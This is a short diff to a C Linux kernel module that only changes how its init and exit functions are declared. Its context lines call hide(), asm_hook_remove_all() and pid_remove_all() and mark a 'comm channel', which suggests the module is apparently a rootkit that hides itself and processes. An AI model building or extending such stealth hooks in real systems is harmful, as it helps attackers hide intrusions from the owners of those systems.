@@ -1191,7 +1191,7 @@ found:
 // ========== END COMM CHANNEL ==========
 
 
-int init(void)
+static int __init init(void)
 {
     pr_info("Module loaded\n");
     hide();
@@ -1237,7 +1237,7 @@ int init(void)
     return 0;
 }
 
-void __exit exit(void)
+static void __exit exit(void)
 {
     asm_hook_remove_all();
     pid_remove_all();
